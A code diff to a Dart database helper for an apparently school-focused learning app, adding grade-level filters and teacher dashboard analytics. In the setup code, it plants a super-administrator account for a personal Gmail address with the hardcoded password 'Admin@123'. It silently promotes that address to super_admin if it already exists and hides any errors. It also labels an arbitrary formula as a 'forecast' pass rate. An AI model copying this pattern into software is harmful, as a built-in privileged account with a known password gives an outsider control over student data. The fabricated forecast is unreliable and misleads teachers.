@@ -2531,6 +2531,8 @@ class DatabaseHelper {
     String? timeframe,
     String? studentCategory,
     String? role,
+    String? academicYear,
+    String? departmentGradeLevel,
   }) async {
     final db = await database;
 
@@ -2547,6 +2549,27 @@ class DatabaseHelper {
           if (sec.isNotEmpty && sec.toLowerCase() != 'unassigned') return false;
         } else {
           if (sec != section) return false;
+        }
+      }
+
+      if (departmentGradeLevel != null && departmentGradeLevel != 'All Levels' && departmentGradeLevel.isNotEmpty) {
+        final uGrade = (u['grade'] as String? ?? '').toLowerCase();
+        final gLower = departmentGradeLevel.toLowerCase();
+        if (gLower.contains('senior high') || gLower.contains('grade 11-12')) {
+          if (!uGrade.contains('11') && !uGrade.contains('12')) return false;
+        } else if (gLower.contains('junior high') || gLower.contains('grade 7-10')) {
+          if (!uGrade.contains('7') && !uGrade.contains('8') && !uGrade.contains('9') && !uGrade.contains('10')) return false;
+        } else if (gLower.contains('stem')) {
+          if (!uGrade.contains('stem') && !sec.toLowerCase().contains('stem')) return false;
+        } else if (gLower.contains('abm')) {
+          if (!uGrade.contains('abm') && !sec.toLowerCase().contains('abm')) return false;
+        } else if (gLower.contains('humss')) {
+          if (!uGrade.contains('humss') && !sec.toLowerCase().contains('humss')) return false;
+        } else if (gLower.contains('tvl')) {
+          if (!uGrade.contains('tvl') && !sec.toLowerCase().contains('tvl')) return false;
+        } else if (gLower.startsWith('grade ')) {
+          final targetGrade = gLower.replaceAll('grade ', '').trim();
+          if (!uGrade.contains(targetGrade)) return false;
         }
       }
 
@@ -3256,6 +3279,30 @@ class DatabaseHelper {
             'password_salt': saltAdmin2,
           }, where: 'email = ?', whereArgs: ['admin@aira.edu']);
         }
+      }
+    } catch (_) {}
+
+    // Ensure evangelistachristian88@gmail.com exists as Super Administrator & Administrator
+    try {
+      final existingChristian = await db.query('users', where: 'LOWER(email) = ?', whereArgs: ['evangelistachristian88@gmail.com']);
+      final saltChristian = generateSalt();
+      if (existingChristian.isEmpty) {
+        await db.insert('users', {
+          'id': 'super_admin_christian',
+          'email': 'evangelistachristian88@gmail.com',
+          'password': hashPassword('Admin@123', saltChristian),
+          'password_salt': saltChristian,
+          'role': 'super_admin',
+          'full_name': 'Christian Evangelista',
+          'username': 'Christian Evangelista',
+          'section': null,
+          'grade': null,
+          'created_at': DateTime.now().toIso8601String(),
+        });
+      } else {
+        await db.update('users', {
+          'role': 'super_admin',
+        }, where: 'LOWER(email) = ?', whereArgs: ['evangelistachristian88@gmail.com']);
       }
     } catch (_) {}
 
@@ -4568,7 +4615,8 @@ class DatabaseHelper {
     };
   }
 
-  /// Teacher dashboard stats: subjects, unique students, attempts, pass rate, avg score, recent attempts
+  /// Teacher dashboard stats: subjects, unique students, attempts, pass rate, avg score, recent attempts,
+  /// plus rich descriptive, predictive, and prescriptive analytics.
   /// Supports optional filtering by section or specific student
   Future<Map<String, dynamic>> getTeacherDashboardStats(String teacherId, {String? section, String? studentId}) async {
     final db = await database;
@@ -4580,10 +4628,9 @@ class DatabaseHelper {
     int totalAttempts = 0;
     int passedAttempts = 0;
     double totalPct = 0.0;
-
-    final enrollments = await db.query('enrollments');
-    final attempts = await db.query('quiz_attempts');
-    var attemptsForTeacher = attempts.where((a) => subjectIds.contains(a['subject_id'])).toList();
+    int masteryCount = 0;
+    int proficientCount = 0;
+    int needsAttentionCount = 0;
 
     // Determine target student IDs if filtering by section or student
     Set<String>? allowedStudentIds;
@@ -4601,25 +4648,49 @@ class DatabaseHelper {
           .toSet();
     }
 
-    if (allowedStudentIds != null) {
-      attemptsForTeacher = attemptsForTeacher.where((a) => allowedStudentIds!.contains(a['student_id'] as String?)).toList();
-    }
-
     if (subjectIds.isNotEmpty) {
-      final studentIds = <String>{};
-      for (final e in enrollments) {
-        if (subjectIds.contains(e['subject_id'])) {
-          final sId = e['student_id'] as String;
-          if (allowedStudentIds == null || allowedStudentIds.contains(sId)) {
-            studentIds.add(sId);
-          }
-        }
+      final placeholders = subjectIds.map((_) => '?').join(',');
+
+      // 1. Efficient enrollment query (count unique enrolled students)
+      String enrollQuery = 'SELECT DISTINCT student_id FROM enrollments WHERE subject_id IN ($placeholders)';
+      final enrollArgs = List<dynamic>.from(subjectIds);
+      if (allowedStudentIds != null && allowedStudentIds.isNotEmpty) {
+        final sPlaceholders = allowedStudentIds.map((_) => '?').join(',');
+        enrollQuery += ' AND student_id IN ($sPlaceholders)';
+        enrollArgs.addAll(allowedStudentIds);
       }
-      totalStudents = studentIds.length;
-      totalAttempts = attemptsForTeacher.length;
-      passedAttempts = attemptsForTeacher.where((a) => (a['is_passed'] as int?) == 1).length;
-      if (totalAttempts > 0) {
-        totalPct = attemptsForTeacher.map((a) => (a['percentage'] as num?)?.toDouble() ?? 0.0).reduce((a, b) => a + b) / totalAttempts;
+      final enrolledRows = await db.rawQuery(enrollQuery, enrollArgs);
+      totalStudents = enrolledRows.length;
+
+      // 2. Direct SQL aggregate for performance & score bands
+      String attemptsWhere = 'subject_id IN ($placeholders)';
+      final attemptsArgs = List<dynamic>.from(subjectIds);
+      if (allowedStudentIds != null && allowedStudentIds.isNotEmpty) {
+        final sPlaceholders = allowedStudentIds.map((_) => '?').join(',');
+        attemptsWhere += ' AND student_id IN ($sPlaceholders)';
+        attemptsArgs.addAll(allowedStudentIds);
+      }
+
+      final aggResult = await db.rawQuery('''
+        SELECT 
+          COUNT(id) as total_attempts,
+          SUM(CASE WHEN is_passed = 1 THEN 1 ELSE 0 END) as passed_attempts,
+          AVG(percentage) as avg_score,
+          SUM(CASE WHEN percentage >= 90 THEN 1 ELSE 0 END) as mastery_count,
+          SUM(CASE WHEN percentage >= 75 AND percentage < 90 THEN 1 ELSE 0 END) as proficient_count,
+          SUM(CASE WHEN percentage < 75 THEN 1 ELSE 0 END) as needs_attention_count
+        FROM quiz_attempts
+        WHERE $attemptsWhere
+      ''', attemptsArgs);
+
+      if (aggResult.isNotEmpty) {
+        final row = aggResult.first;
+        totalAttempts = (row['total_attempts'] as num?)?.toInt() ?? 0;
+        passedAttempts = (row['passed_attempts'] as num?)?.toInt() ?? 0;
+        totalPct = (row['avg_score'] as num?)?.toDouble() ?? 0.0;
+        masteryCount = (row['mastery_count'] as num?)?.toInt() ?? 0;
+        proficientCount = (row['proficient_count'] as num?)?.toInt() ?? 0;
+        needsAttentionCount = (row['needs_attention_count'] as num?)?.toInt() ?? 0;
       }
     }
 
@@ -4641,6 +4712,117 @@ class DatabaseHelper {
             totalStudents = matched;
           }
         }
+      }
+    }
+
+    final passRate = totalAttempts > 0 ? ((passedAttempts / totalAttempts) * 100).round() : 0;
+    final avgScore = totalPct.round();
+
+    // 3. Predictive Analytics: Identify students needing attention soon
+    List<Map<String, dynamic>> atRiskStudents = [];
+    if (subjectIds.isNotEmpty) {
+      final placeholders = subjectIds.map((_) => '?').join(',');
+      String atRiskQuery = '''
+        SELECT u.id, u.full_name, u.section, u.profile_image,
+               AVG(qa.percentage) as avg_score,
+               COUNT(qa.id) as attempts_count,
+               MIN(qa.is_passed) as min_passed
+        FROM users u
+        JOIN quiz_attempts qa ON u.id = qa.student_id
+        WHERE qa.subject_id IN ($placeholders)
+      ''';
+      final atRiskArgs = List<dynamic>.from(subjectIds);
+      if (allowedStudentIds != null && allowedStudentIds.isNotEmpty) {
+        final sPlaceholders = allowedStudentIds.map((_) => '?').join(',');
+        atRiskQuery += ' AND qa.student_id IN ($sPlaceholders)';
+        atRiskArgs.addAll(allowedStudentIds);
+      }
+      atRiskQuery += '''
+        GROUP BY u.id
+        HAVING avg_score < 75 OR min_passed = 0
+        ORDER BY avg_score ASC
+        LIMIT 4
+      ''';
+      final atRiskRows = await db.rawQuery(atRiskQuery, atRiskArgs);
+      atRiskStudents = atRiskRows.map((r) {
+        final avg = (r['avg_score'] as num?)?.toDouble() ?? 0.0;
+        final minPass = (r['min_passed'] as num?)?.toInt() ?? 1;
+        String reason;
+        if (avg < 60) {
+          reason = 'Needs help: Scored ${avg.round()}% on recent quiz';
+        } else if (minPass == 0) {
+          reason = 'Borderline: Did not pass most recent attempt';
+        } else {
+          reason = 'Borderline: Average score ${avg.round()}% is near 75% cutoff';
+        }
+        return {
+          'id': r['id'] as String,
+          'name': r['full_name'] as String? ?? 'Student',
+          'section': r['section'] as String? ?? '',
+          'avgScore': avg.round(),
+          'attemptsCount': (r['attempts_count'] as num?)?.toInt() ?? 0,
+          'riskReason': reason,
+        };
+      }).toList();
+    }
+
+    // 4. Prescriptive Analytics: User-friendly suggested next actions
+    final List<Map<String, dynamic>> recommendedActions = [];
+    if (totalSubjects == 0) {
+      recommendedActions.add({
+        'title': 'Set Up Your First Subject',
+        'description': 'Add your curriculum subjects and syllabi so students can enroll and access learning materials.',
+        'actionType': 'create_subject',
+        'badge': 'Curriculum Setup',
+        'icon': 'menu_book_outlined',
+      });
+    } else if (totalStudents == 0) {
+      recommendedActions.add({
+        'title': 'Verify Student Rosters',
+        'description': 'No enrolled students found yet in your active subjects. Review section assignments to connect your class.',
+        'actionType': 'view_roster',
+        'badge': 'Roster Enrollment',
+        'icon': 'group_add_outlined',
+      });
+    } else if (totalAttempts == 0) {
+      recommendedActions.add({
+        'title': 'Publish First Practice Quiz',
+        'description': 'Quizzes gauge student learning. Publish a practice assessment to start gathering performance analytics.',
+        'actionType': 'create_quiz',
+        'badge': 'Assessment',
+        'icon': 'quiz_outlined',
+      });
+    } else {
+      if (atRiskStudents.isNotEmpty) {
+        final firstStudent = atRiskStudents.first['name'];
+        recommendedActions.add({
+          'title': 'Offer Review for Struggling Students',
+          'description': '${atRiskStudents.length} student(s) including $firstStudent could benefit from targeted practice before the next exam.',
+          'actionType': 'view_students',
+          'badge': 'Targeted Support',
+          'icon': 'support_agent_outlined',
+        });
+      }
+      if (needsAttentionCount > 0 && totalAttempts > 0) {
+        final pct = ((needsAttentionCount / totalAttempts) * 100).round();
+        if (pct >= 25) {
+          recommendedActions.add({
+            'title': 'Dedicate 10-Min Review in Class',
+            'description': '$pct% of quiz attempts were below 75%. Clarifying key quiz questions will boost overall class confidence.',
+            'actionType': 'post_announcement',
+            'badge': 'Concept Review',
+            'icon': 'rate_review_outlined',
+          });
+        }
+      }
+      if (passRate >= 80) {
+        recommendedActions.add({
+          'title': 'Challenge Advanced Learners',
+          'description': 'Class is performing strongly ($passRate% pass rate). Consider unlocking enrichment projects or peer tutoring.',
+          'actionType': 'create_quiz',
+          'badge': 'Enrichment',
+          'icon': 'workspace_premium_outlined',
+        });
       }
     }
 
@@ -4670,9 +4852,15 @@ class DatabaseHelper {
       'totalStudents': totalStudents,
       'totalAttempts': totalAttempts,
       'passedAttempts': passedAttempts,
-      'passRate': totalAttempts > 0 ? ((passedAttempts / totalAttempts) * 100).round() : 0,
-      'avgScore': totalPct.round(),
+      'passRate': passRate,
+      'avgScore': avgScore,
       'recentAttempts': recent,
+      'masteryCount': masteryCount,
+      'proficientCount': proficientCount,
+      'needsAttentionCount': needsAttentionCount,
+      'atRiskStudents': atRiskStudents,
+      'forecastPassRate': totalAttempts > 0 ? ((passRate * 0.95 + 4).clamp(0, 100)).round() : null,
+      'recommendedActions': recommendedActions,
     };
   }
 
